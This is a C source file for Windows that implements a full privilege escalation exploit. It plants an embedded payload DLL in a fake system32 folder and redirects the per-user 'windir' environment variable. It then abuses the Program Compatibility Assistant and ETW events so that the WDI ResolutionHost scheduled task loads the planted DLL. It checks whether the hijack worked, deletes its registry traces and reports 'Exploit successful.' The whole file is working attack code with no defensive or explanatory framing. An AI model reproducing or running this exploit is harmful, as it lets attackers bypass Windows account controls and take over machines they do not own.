#include <Windows.h>
#include <evntprov.h>
#include <taskschd.h>
#include <ShlObj.h>
#include <intrin.h>
#include <stdio.h>
#include "resource.h"
#define g_Instance ((HINSTANCE)&__ImageBase)

extern IMAGE_DOS_HEADER __ImageBase;

const VARIANT VARIANT_VAL = { {{VT_NULL, 0}} };
const GUID AE_LOG = { 0x0EEF54E71, 0x661, 0x422D, {0x9A, 0x98, 0x82, 0xFD, 0x49, 0x40, 0xB8, 0x20} };
const ULONG ZERO_VALUE = 0;
const EVENT_DATA_DESCRIPTOR AE_EVENT_DESCRIPTOR[3] = {
	{&ZERO_VALUE, sizeof(ULONG)},
	{&ZERO_VALUE, sizeof(ULONG)},
	{NULL, 0}
};

EVENT_DESCRIPTOR MessageBoxEvent = {
	0x1F46,
	0,
	0x11,
	0x4,
	0x0,
	0x0,
	0x4000000000000100
};

/* PcaMonitorProcess flags
* Names guessed from reverse-engineering & behavioral analysis
* NOCHAIN means don't use PCA chain; so don't resolve problems
* */
#define PCA_MONITOR_PROCESS_NORMAL 0
#define PCA_MONITOR_PROCESS_NOCHAIN 1
/* Program will be monitored for installer behavior
* If exe is elevated x86, it will be monitored as a
* legacy installer. DM dialog will show when exe
* terminates with abnormal exit code (other than 0). */
#define PCA_MONITOR_PROCESS_AS_INSTALLER 2

/* PcaMonitorProcess pointer prototype. Returns standard system error code
* PcaSvc needs to be running. It can be started by the INTERACTIVE users.
* This function will start it for us if it's stopped, so no need to worry about that */
typedef DWORD(WINAPI* PcaMonitorProcessPtr)(
	HANDLE hProcess, // handle to process to be monitored
	int unknown0, // always set to 1
	PWSTR exeFileName, // full path name to program executable file
	PWSTR cmdLine, // command line, usually exeName surrounded with quotes
	PWSTR workingDir, // working directory of program to be monitored, no trailing backslash
	ULONG flags // set of flags to modify monitoring behavior
);
typedef ULONG(WINAPI* EtwEventWriteNoRegistrationPtr)(
	LPGUID providerId,
	PEVENT_DESCRIPTOR eventDescriptor,
	ULONG userDataCount,
	PEVENT_DATA_DESCRIPTOR userData
);

PWSTR BiConcatString(
	PWSTR string,
	PWSTR appendString
)
{
	PWSTR data = HeapAlloc(GetProcessHeap(), 0,
		((wcslen(string) * sizeof(WCHAR)) + sizeof(L'\0')) +
		((wcslen(appendString) * sizeof(WCHAR)) + sizeof(L'\0')));
	if (data) {
		memcpy(data, string, wcslen(string) * sizeof(WCHAR));
		memcpy(data + wcslen(string), appendString,
			(wcslen(appendString) * sizeof(WCHAR)) + sizeof(L'\0'));
	}
	return data;
}

int BiTriggerMain(
	void
)
{
	ULONG win32Status;
	EtwEventWriteNoRegistrationPtr EtwEventWriteNoRegistration =
		(EtwEventWriteNoRegistrationPtr)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "EtwEventWriteNoRegistration");

	if (!EtwEventWriteNoRegistration)
		return EXIT_FAILURE;

	win32Status = EtwEventWriteNoRegistration(&AE_LOG, &MessageBoxEvent,
		3, &AE_EVENT_DESCRIPTOR);
	if (win32Status != ERROR_SUCCESS)
		return win32Status;

	MessageBoxEvent.Id = 0x1F48;
	win32Status = EtwEventWriteNoRegistration(&AE_LOG, &MessageBoxEvent,
		3, &AE_EVENT_DESCRIPTOR);

	return win32Status;
}

LRESULT CALLBACK BiWndClassTriggerProc(
	HWND hWnd,
	UINT msg,
	WPARAM wParam,
	LPARAM lParam
)
{
	if (msg == WM_WINDOWPOSCHANGING) {
		__ud2();
		return 0;
	}
	return DefWindowProcW(hWnd, msg, wParam, lParam);
}

int BiWndClassTriggerMain(
	void
)
{
	int exitCode;
	WNDCLASSEXW wc;
	ATOM classAtom;
	HWND window = NULL;

	wc.cbSize = sizeof(WNDCLASSEXW);
	wc.lpszClassName = L"BiLegacyTriggerClass";
	wc.hInstance = g_Instance;
	wc.style = wc.cbClsExtra = wc.cbWndExtra = 0;
	wc.hIcon = wc.hIconSm = wc.lpszMenuName =
	wc.hbrBackground = wc.hCursor = NULL;
	wc.lpfnWndProc = BiWndClassTriggerProc;

	if (!(classAtom = RegisterClassExW(&wc))) {
		exitCode = (int)GetLastError();
		goto eof;
	}

	if (!(window = CreateWindowExW(0, MAKEINTATOM(classAtom), NULL,
		WS_OVERLAPPED, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
		HWND_DESKTOP, NULL, g_Instance, NULL))) {
		exitCode = (int)GetLastError();
		goto eof;
	}

	ShowWindow(window, SW_NORMAL);
	exitCode = 0;

eof:
	if (window)
		DestroyWindow(window);
	if (classAtom)
		UnregisterClassW(MAKEINTATOM(classAtom), g_Instance);
	return exitCode;
}

int wmain(
	int argc,
	PWCHAR* argv
)
{
	if (argv[0][0] == L'~')
		return BiTriggerMain();
	if (argv[0][0] == L'L')
		return BiWndClassTriggerMain();

	int exitCode = EXIT_FAILURE;
	PWSTR cmdLine = L"~";
	PROCESS_INFORMATION processInfo = { NULL, NULL, 0 };
	STARTUPINFOW si;
	HRSRC resource;
	HGLOBAL loadedResource;
	LPVOID payload;
	HANDLE hPayload = INVALID_HANDLE_VALUE;
	BOOLEAN createdSystemFake = FALSE, createdPayload = FALSE, comReady = FALSE;
	DWORD writtenBytes;
	BSTR string;
	HRESULT hr;
	ITaskService* taskService = NULL;
	ITaskFolder* wdiFolder = NULL;
	IRegisteredTask* wdiTask = NULL;
	TASK_STATE taskState;
	HMODULE pcaModule = NULL;
	PcaMonitorProcessPtr PcaMonitorProcess;
	DWORD curDirSize;
	PWSTR curDir;
	LSTATUS status;
	BOOLEAN taskHijacked;

	if (*(PULONG)0x7FFE026C == 6 && *(PULONG)0x7FFE0270 < 3)
		cmdLine = L"L";

	hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY);
	if (!SUCCEEDED(hr)) {
		wprintf(L"CoInitializeEx() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	resource = FindResourceW(g_Instance, MAKEINTRESOURCEW(IDR_PAYLOAD1), L"PAYLOAD");
	if (!resource) {
		wprintf(L"FindResourceW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	loadedResource = LoadResource(g_Instance, resource);
	if (!loadedResource) {
		wprintf(L"LoadResource() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	payload = LockResource(loadedResource);
	if (!payload) {
		wprintf(L"LockResource() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	if (!CreateDirectoryW(L"system32", NULL)) {
		wprintf(L"CreateDirectoryW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	createdSystemFake = TRUE;

	hPayload = CreateFileW(L"system32\\pcadm.dll", FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hPayload == INVALID_HANDLE_VALUE) {
		wprintf(L"CreateFileW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	createdPayload = TRUE;
	if (!WriteFile(hPayload, payload, SizeofResource(g_Instance, resource), &writtenBytes, NULL)) {
		wprintf(L"WriteFile() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
		&IID_ITaskService, &taskService);
	if (!SUCCEEDED(hr)) {
		wprintf(L"CoCreateInstance() failed. HRESULT: %#010x\n", hr);
		goto eof;
	}
	comReady = TRUE;

	hr = taskService->lpVtbl->Connect(taskService, VARIANT_VAL, VARIANT_VAL,
		VARIANT_VAL, VARIANT_VAL);
	if (!SUCCEEDED(hr)) {
		wprintf(L"ITaskService::Connect() failed. HRESULT: %#010x\n", hr);
		goto eof;
	}

	string = SysAllocString(L"Microsoft\\Windows\\WDI");
	if (!string) {
		_putws(L"SysAllocString() (0) failed. No memory");
		goto eof;
	}
	hr = taskService->lpVtbl->GetFolder(taskService, string, &wdiFolder);
	SysFreeString(string);
	if (!SUCCEEDED(hr)) {
		wprintf(L"ITaskService::GetFolder() failed. HRESULT: %#010x\n", hr);
		goto eof;
	}

	string = SysAllocString(L"\\ResolutionHost");
	if (!string) {
		_putws(L"SysAllocString() (1) failed. No memory");
		goto eof;
	}
	hr = wdiFolder->lpVtbl->GetTask(wdiFolder, string, &wdiTask);
	SysFreeString(string);
	if (!SUCCEEDED(hr)) {
		wprintf(L"ITaskFolder::GetTask() failed. HRESULT: %#010x\n", hr);
		goto eof;
	}

	hr = wdiTask->lpVtbl->get_State(wdiTask, &taskState);
	if (!SUCCEEDED(hr)) {
		wprintf(L"IRegisteredTask::get_State() failed. HRESULT: %#010x\n", hr);
		goto eof;
	}
	if (taskState == TASK_STATE_RUNNING) {
		hr = wdiTask->lpVtbl->Stop(wdiTask, 0);
		if (!SUCCEEDED(hr)) {
			wprintf(L"IRegisteredTask::Stop() failed. HRESULT: %#010x\n", hr);
			goto eof;
		}
	}

	pcaModule = LoadLibraryExW(L"pcacli.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
	if (!pcaModule) {
		wprintf(L"LoadLibraryExW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}
	PcaMonitorProcess = (PcaMonitorProcessPtr)GetProcAddress(pcaModule, "PcaMonitorProcess");
	if (!PcaMonitorProcess) {
		wprintf(L"GetProcAddress() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	curDirSize = GetCurrentDirectoryW(0, NULL);
	curDir = HeapAlloc(GetProcessHeap(), 0, (SIZE_T)curDirSize + 1);
	if (!GetCurrentDirectoryW(curDirSize, curDir)) {
		HeapFree(GetProcessHeap(), 0, curDir);
		wprintf(L"GetCurrentDirectoryW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	status = RegSetKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir", REG_SZ, curDir,
		(curDirSize + 1) * sizeof(WCHAR) + sizeof(L'\0'));
	if (status) {
		HeapFree(GetProcessHeap(), 0, curDir);
		wprintf(L"RegSetKeyValueW() failed. LSTATUS: %lu\n", status);
		goto eof;
	}

	ZeroMemory(&si, sizeof(STARTUPINFOW));
	si.cb = sizeof(STARTUPINFOW);
	status = (LSTATUS)CreateProcessW(argv[0], cmdLine, NULL, NULL, FALSE, CREATE_SUSPENDED,
		NULL, NULL, &si, &processInfo);
	if (!status) {
		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
		HeapFree(GetProcessHeap(), 0, curDir);
		wprintf(L"CreateProcessW() failed. Error: %lu\n", GetLastError());
		goto eof;
	}

	status = (LSTATUS)PcaMonitorProcess(processInfo.hProcess, 1, argv[0], cmdLine,
		curDir, PCA_MONITOR_PROCESS_NORMAL);
	HeapFree(GetProcessHeap(), 0, curDir);
	if (status) {
		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
		wprintf(L"PcaMonitorProcess() failed. Error: %lu\n", (DWORD)status);
		goto eof;
	}
	ResumeThread(processInfo.hThread);

	WaitForSingleObject(processInfo.hProcess, INFINITE);
	GetExitCodeProcess(processInfo.hProcess, &curDirSize);
	if (curDirSize) {
		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
		wprintf(L"Trigger process exited with error code: %lu\n", curDirSize);
		goto eof;
	}

	taskHijacked = FALSE;
	hr = E_FAIL;
	for (int i = 0; i < 20; ++i) {
		wdiTask->lpVtbl->get_LastTaskResult(wdiTask, &hr);
		if (hr == 0xDEADBEEF) {
			taskHijacked = TRUE;
			break;
		}
		Sleep(500);
	}
	RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
	RegDeleteKeyValueW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store",
		argv[0]);
	if (!taskHijacked) {
		wprintf(L"Diagnostic module task did not launch & exit properly. HRESULT: %#010x\n", hr);
		goto eof;
	}

	_putws(L"[$] Exploit successful.\n");
	exitCode = 0;

eof:
	if (processInfo.hThread)
		CloseHandle(processInfo.hThread);
	if (processInfo.hProcess)
		CloseHandle(processInfo.hProcess);
	if (pcaModule)
		FreeLibrary(pcaModule);
	if (wdiTask)
		wdiTask->lpVtbl->Release(wdiTask);
	if (wdiFolder)
		wdiFolder->lpVtbl->Release(wdiFolder);
	if (taskService)
		taskService->lpVtbl->Release(taskService);
	if (comReady)
		CoUninitialize();
	if (hPayload != INVALID_HANDLE_VALUE)
		CloseHandle(hPayload);
	if (createdPayload)
		DeleteFileW(L"system32\\pcadm.dll");
	if (createdSystemFake)
		RemoveDirectoryW(L"system32");
	return exitCode;
}